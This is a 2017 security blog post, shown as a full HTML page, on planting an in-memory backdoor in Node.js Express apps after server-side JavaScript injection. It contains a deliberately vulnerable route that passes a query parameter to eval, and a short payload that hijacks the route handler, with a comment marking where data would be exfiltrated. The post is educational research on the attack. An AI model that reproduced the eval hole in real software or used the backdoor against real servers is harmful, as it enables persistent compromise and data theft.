<!DOCTYPE html>
<html lang="en">
  <head>
  <meta http-equiv="content-type" content="text/html;charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noodp"/>
  
  
  
  
  
  <link rel="prev" href="http://evilpacket.net/2017/compromising-node-js-apps-using-machine-in-the-middle/" />
  <link rel="next" href="http://evilpacket.net/2017/my-story-about-mentorship/" />
  <link rel="canonical" href="http://evilpacket.net/2017/in-memory-backdoor-for-node-js-express-apps/" />
  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  <title>
       
       
           In Memory Backdoor for Node.js Express Apps | EvilPacket
       
  </title>
  <meta name="title" content="In Memory Backdoor for Node.js Express Apps | EvilPacket">
    
  
  <link rel="stylesheet" href="/font/iconfont.css">
  <link rel="stylesheet" href="/css/main.min.css">


  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="In Memory Backdoor for Node.js Express Apps"/>
<meta name="twitter:description" content="Earlier this week Zach Grace published an article on one way that you could backdoor a Node.js Express application without touching disk. This jogged my memory of something I posted in our team’s chat this last week but never wrote about; how I would in memory backdoor an express application. It’s a bit different than how Zach approached it so I thought it would be good to expand upon his post sharing the knowledge."/>

  <script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BlogPosting",
  "headline": "In Memory Backdoor for Node.js Express Apps",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http:\/\/evilpacket.net\/2017\/in-memory-backdoor-for-node-js-express-apps\/"
  },
  "image": {
    "@type": "ImageObject",
    "url": "http:\/\/evilpacket.net\/cover.png",
    "width":  800 ,
    "height":  600 
  },
  "genre": "posts",
  
  "wordcount":  575 ,
  "url": "http:\/\/evilpacket.net\/2017\/in-memory-backdoor-for-node-js-express-apps\/",
  "datePublished": "2017-03-02T17:15:51-08:00",
  "dateModified": "2017-03-02T17:15:51-08:00",
  
  "publisher": {
    "@type": "Organization",
    "name": "Adam BValdwin",
    "logo": {
      "@type": "ImageObject",
      "url": "http:\/\/evilpacket.net\/logo.png",
      "width":  127 ,
      "height":  40 
    }
  },
  "author": {
    "@type": "Person",
    "name": "Adam Baldwin"
  },
  "description": ""
}
</script>
</head>

  



  <body class="">
    <div class="wrapper">
        <nav class="navbar">
    <div class="container">
        <div class="navbar-header header-logo">
        	<a href="http://evilpacket.net/">EvilPacket</a>
        </div>
        <div class="menu navbar-right">
                
                
                <a class="menu-item" href="/posts/" title="">Blog</a>
                
                <a class="menu-item" href="/presentations" title="">Presentations</a>
                
                <a class="menu-item" href="/vulns" title="">Vulnerabilities</a>
                
                <a class="menu-item" href="/about" title="">About</a>
                
                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
        </div>
    </div>
</nav>
<nav class="navbar-mobile" id="nav-mobile" style="display: none">
     <div class="container">
        <div class="navbar-header">
            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="http://evilpacket.net/">EvilPacket</a></div>
            <div class="menu-toggle">
                <span></span><span></span><span></span>
            </div>
        </div>
     
          <div class="menu" id="mobile-menu">
                
                
                <a class="menu-item" href="/posts/" title="">Blog</a>
                
                <a class="menu-item" href="/presentations" title="">Presentations</a>
                
                <a class="menu-item" href="/vulns" title="">Vulnerabilities</a>
                
                <a class="menu-item" href="/about" title="">About</a>
                
        </div>
    </div>
</nav>

    	 <main class="main">
          <div class="container">
      		
<article class="post-warp">
    <header class="post-header">
        <h1 class="post-title">In Memory Backdoor for Node.js Express Apps</h1>
        <div class="post-meta">
            Written by <a href="http://evilpacket.net/" rel="author">Adam Baldwin</a> with ♥ 
                <span class="post-time">
                    on <time datetime=2017-03-02 >2 March 2017</time>
                </span>
                in
                
                <i class="iconfont icon-timer"></i>
                3 min
        </div>
    </header>
    <div class="post-content">
        

        
            
        

        
        
     
          
          
          

          
          
          

          <p>Earlier this week Zach Grace published an article on one way that you could backdoor a Node.js Express application without touching disk. This jogged my memory of something I posted in our team’s chat this last week but never wrote about; how I would in memory backdoor an express application. It’s a bit different than how Zach approached it so I thought it would be good to expand upon his post sharing the knowledge.</p>
<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/2017/03/slack.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
<p>My “vulnerable” proof of concept is below. It uses a fairly common pattern of putting routes in a separate file. The eval is for convenience of demonstration and isn’t a pattern we find frequently.</p>
<p>Server (index.js)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#960050;background-color:#1e0010">‘</span><span style="color:#a6e22e">express</span><span style="color:#960050;background-color:#1e0010">’</span>)
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">routes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#960050;background-color:#1e0010">‘</span>.<span style="color:#f92672">/</span><span style="color:#a6e22e">routes</span><span style="color:#960050;background-color:#1e0010">’</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#960050;background-color:#1e0010">‘</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">’</span>, <span style="color:#a6e22e">routes</span>);

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, <span style="color:#66d9ef">function</span> () {
 <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#960050;background-color:#1e0010">‘</span><span style="color:#a6e22e">Example</span> <span style="color:#a6e22e">app</span> <span style="color:#a6e22e">listening</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">port</span> <span style="color:#ae81ff">3000</span><span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">’</span>)
})
</code></pre></div><p>routes.js</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#960050;background-color:#1e0010">‘</span><span style="color:#a6e22e">express</span><span style="color:#960050;background-color:#1e0010">’</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();

<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">route</span>(<span style="color:#960050;background-color:#1e0010">‘</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">’</span>).<span style="color:#a6e22e">get</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
 <span style="color:#75715e">// Assume some sort of code execution here
</span><span style="color:#75715e"></span> eval(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">code</span>);
 <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#960050;background-color:#1e0010">‘</span><span style="color:#a6e22e">completed</span><span style="color:#960050;background-color:#1e0010">’</span>);
 <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#960050;background-color:#1e0010">‘’</span>);
})

<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>;
</code></pre></div><p>Now if we try and exploit and backdoor this app the way that Zach approached the problem we can’t for one simple reason, <em>app</em> is not defined. Now this won’t always be the case, but it’s very common for express applications to specify their routes in another file making app unavailable. Even if you call <em>app=express()</em>, as the express variable is available you get a different instance of express, so no go there.</p>
<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/2017/03/apperror.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
<p>What we do always, for sure, have access to are req (request) and res (response) but since we don’t know the names the developer used we’ll have to use what is always there, <em>arguments.</em></p>
<p>The approach I thought to take was to find a route in the existing routing table (my example only has 1 route so we assume that but we would have to add some logic to find the route we wanted to backdoor, or maybe backdoor all of them ;). Then we wrap that route with our logic and we’re done.</p>
<p>Note: I’m sure with enough digging in the innards of req or res one could find a reference to app and perform the same attack that Zack mentioned.</p>
<p>Update (3/3/17, 9:53am): That didn’t take long. <a href="https://twitter.com/chrisfosterelli">Chris Foster</a> <a href="https://twitter.com/chrisfosterelli/status/837721284427427842">pointed out</a> that you can use <em>arguments[0].app</em> to get access to <em>app</em> consistently. Embarrassingly enough this is documented in the <a href="http://expressjs.com/en/4x/api.html#req.app">express docs</a>.</p>
<p>Here is how you would find that route and it’s handler (function) and save it for later.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">bd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">arguments</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">route</span>.<span style="color:#a6e22e">stack</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">handle</span>;
<span style="color:#75715e">// same as req.route.stack[0].handle;
</span></code></pre></div><p>Then we want to replace the original handler with our function, but make sure we call the original.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">arguments</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">route</span>.<span style="color:#a6e22e">stack</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">handle</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>,<span style="color:#a6e22e">next</span>){
 <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;0wned&#39;</span>); <span style="color:#75715e">// exfiltrate things here
</span><span style="color:#75715e"></span> <span style="color:#a6e22e">bd</span>(<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>,<span style="color:#a6e22e">next</span>)
}
</code></pre></div>
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/O5LnHawtFbc" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<p>The reality here is that if you can get server side JavaScript injection on a node.js application it’s likely game over. You just don’t have the sandbox like you have with a browser. You will find one way or another to exfiltrate data, gain access to other parts of the applications or simply gain control of the server as the user that is running the Node.js process.</p>
<p>There are runtime protections being explored for node but they are all still very early in development. <a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2017/01/nodejs_tr.pdf">See this paper from Microsoft Research</a></p>
<p>My take away here for all attackers is that context matters a lot for exploitation and be careful to not make assumptions about your execution environment when you are developing your payloads.</p>
<p>For more JavaScript internals read the “<a href="https://gist.github.com/evilpacket/36a60080a50db09721c4563228551d2b">When This is really That”</a> post by <a href="https://twitter.com/jon_lamendola">Jon Lamendola</a>.</p>

    </div>

    <div class="post-copyright">
             
            <p class="copyright-item">
                <span>Author:</span>
                <span>Adam Baldwin </span>
                </p>
            
           
            <p class="copyright-item">
                    <span>Words:</span>
                   <span>575</span>
            </p>
            
            <p class="copyright-item">
                
                <span>Share:</span>
                <span>

      
        <a href="//twitter.com/share?url=http%3a%2f%2fevilpacket.net%2f2017%2fin-memory-backdoor-for-node-js-express-apps%2f&amp;text=In%20Memory%20Backdoor%20for%20Node.js%20Express%20Apps&amp;via=adam_baldwin" target="_blank" title="Share on Twitter">
          <i class="iconfont icon-twitter"></i>
        </a>
        
      
      
        <a href="//www.facebook.com/sharer/sharer.php?u=http%3a%2f%2fevilpacket.net%2f2017%2fin-memory-backdoor-for-node-js-express-apps%2f" target="_blank" title="Share on Facebook">
          <i class="iconfont icon-facebook"></i>
        </a>
        
      
      
      
      
        <a href="//www.linkedin.com/shareArticle?url=http%3a%2f%2fevilpacket.net%2f2017%2fin-memory-backdoor-for-node-js-express-apps%2f&amp;title=In%20Memory%20Backdoor%20for%20Node.js%20Express%20Apps" target="_blank" title="Share on LinkedIn">
          <i class="iconfont icon-linkedin"></i>
        </a>
        
      
      
        
      
        
      

          

          

          

          
</span>
                
            </p>

            
    </div>

  
    <div class="post-tags">
        
        <section>
                <a href="javascript:window.history.back();">Back</a></span> · 
                <span><a href="http://evilpacket.net/">Home</a></span>
        </section>
    </div>

    <div class="post-nav">
        
        <a href="http://evilpacket.net/2017/compromising-node-js-apps-using-machine-in-the-middle/" class="prev" rel="prev" title="Compromising Node.js apps using Machine-in-the-Middle"><i class="iconfont icon-dajiantou"></i>&nbsp;Compromising Node.js apps using Machine-in-the-Middle</a>
         
        
        <a href="http://evilpacket.net/2017/my-story-about-mentorship/" class="next" rel="next" title="My story about mentorship and my career">My story about mentorship and my career&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
        
    </div>

    <div class="post-comment">
          
          

 

          
    </div>
</article>
          </div>
		   </main>
      <footer class="footer">
    <div class="copyright">
        &copy;
        
        <span itemprop="copyrightYear">2019 - 2021</span>
        
         
            <span class="author" itemprop="copyrightHolder"><a href="http://evilpacket.net/">Adam Baldwin</a> | </span>
         

		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
    </div>
</footer>












    
    <link crossorigin="anonymous" integrity="sha384-yziQACfvCVwLqVFLqkWBYRO3XeA4EqzfXKGwaWnenYn5XzqfJFlFdKEmvutIQdKb" href="https://lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">
      
     <script src="/js/vendor_gallery.min.js" async="" ></script>
    
  







     </div>
  </body>
</html>
